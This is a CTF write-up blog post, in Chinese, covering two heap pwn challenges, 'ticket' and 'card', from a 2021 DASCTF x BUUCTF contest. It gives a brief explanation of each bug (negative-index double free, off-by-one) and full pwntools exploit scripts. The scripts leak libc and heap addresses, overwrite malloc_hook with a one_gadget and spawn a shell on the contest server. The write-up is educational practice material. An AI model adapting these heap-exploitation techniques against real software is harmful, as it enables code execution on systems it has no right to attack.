# 2021DASxBUUCTF May


# 安恒五月赛

常规pwn

<!--more-->

# ticket

**dele**函数中，没有检查下标为负数的情况，所以可以通过age来伪造chunk指针构成double free，然后`malloc_hook`和`realloc_hook`配合get shell

```python
from pwn import *

context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
 
# p = process('./ticket',env={'LD_PRELOAD':'./libc-2.23.so'})
p = remote('node3.buuoj.cn',27905)
libc =ELF('./libc-2.23.so')

def add(idx, size):
    p.sendlineafter('>> ','1')
    p.sendlineafter('Index: ', str(idx))
    p.sendlineafter('size: ', str(size))

def dele(idx):
    p.sendlineafter('>> ','2')
    p.sendlineafter('Index: ', str(idx))

def edit(idx,data):
    p.sendlineafter('>> ','3')
    p.sendlineafter('Index: ', str(idx))
    p.sendafter('remarks: ',data)

def show(idx):
    p.sendlineafter('>> ','4')
    p.sendlineafter('Index: ', str(idx))

def edit_info(name,say,age):
    p.sendlineafter('>> ','5')
    p.sendlineafter('name: ', str(name))
    p.sendlineafter('fei):', str(say))
    p.sendlineafter('age: ',str(age))

def show_info():
    p.sendlineafter('>> ','6')

p.sendlineafter('name: ', 'name')
p.sendlineafter('fei):', 'say')
p.sendlineafter('age: ',str(0x101))

add(0,0x100)
add(1,0x20)
add(2,0x60)
add(3,0x60)
add(4,0x60)
add(5,0x60)
dele(0)

add(0,0x100)
show(0)

malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) -88 -0x10
libcbase = malloc_hook - libc.sym['__malloc_hook']
leak('libc base',libcbase)
realloc = libcbase + libc.sym['realloc']
one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
og = libcbase + one[1]

dele(-1)
dele(-2)

show_info()
p.recvuntil('Name: ')
heap = u64(p.recvuntil('\n',drop= True).ljust(8,'\x00')) - 0x30 + 0x1a0+0x10
leak('heap',heap)

dele(0)
dele(1)
dele(2) # 60
edit_info(p64(heap),p64(heap),heap)
dele(3) # 60
dele(-3) # 60

add(0,0x60)
edit(0,p64(malloc_hook-0x23))
add(1,0x60)
add(2,0x60) 
add(3,0x60) # malloc_hook

edit(3,'a'*(13-2)+p64(og)+p64(realloc))
# gdb.attach(p)
dele(1)
add(1,0x20)
p.interactive()

```

# card

edit有`off-by-one`，打`tcache_struct`来leak libc，然后`malloc_hook`写og

```python
from pwn import *

context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
# env={'LD_PRELOAD':'./libc.so'}
# p = process('./pwn')
p = remote('node3.buuoj.cn',26067)
libc = ELF('./libc.so')

def add(idx,size,data):
    p.sendlineafter('choice:','1')
    p.recvuntil('card:')
    p.sendline(str(idx))
    p.recvuntil('power:')
    p.sendline(str(size))
    p.recvuntil('quickly!')
    p.send(data)

def dele(idx):
    p.sendlineafter('choice:','3')
    p.recvuntil('card:')
    p.sendline(str(idx))    

def edit(idx,data):
    p.sendlineafter('choice:','2')
    p.recvuntil('card')
    p.sendline(str(idx))
    p.recvuntil('show')
    p.sendline(data)

def show(idx):
    p.sendlineafter('choice:','4')
    p.recvuntil('index:')
    p.sendline(str(idx))

one = [0x4f2c5, 0x4f322, 0x10a38c]

add(0, 0x18, '0'*8) # 0x20
add(1, 0x38, '1'*8) # 0x40
add(2, 0x38, '2'*8) # 0x40
add(3, 0x38, '3'*8) # 0x40

edit(0,'a'*0x18+'\x81')
dele(1)
dele(3)
dele(2)

add(1, 0x78, '\x00') # 0x81
show(1)
heap = u64(p.recvuntil('\x56')[-6:].ljust(8,'\x00')) -0x2c0 -0x40
leak('heap',heap)
tcache = heap + 0x10
payload = '\x00'*0x38 + p64(0x41) + p64(tcache)
edit(1,payload)

add(2, 0x38, 'A'*18)
add(3, 0x38, 'A'*38) # tcache

dele(3)
add(3, 0x68,'a'*8)

show(3)
malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 672 - 0x10
leak("malloc_hook",malloc_hook)
libcbase = malloc_hook - libc.sym['__malloc_hook']
free_hook = libcbase + libc.sym['__free_hook']
leak('libcbase',libcbase)
og = libcbase + one[2]
edit(3,p64(malloc_hook)*13)

# show(3)
add(6,0x20,p64(og)*2)
# gdb.attach(p)
p.sendlineafter('choice:','1')
p.recvuntil('card:')
p.sendline(str(7))
p.recvuntil('power:')
p.sendline(str(66))

p.interactive()
```


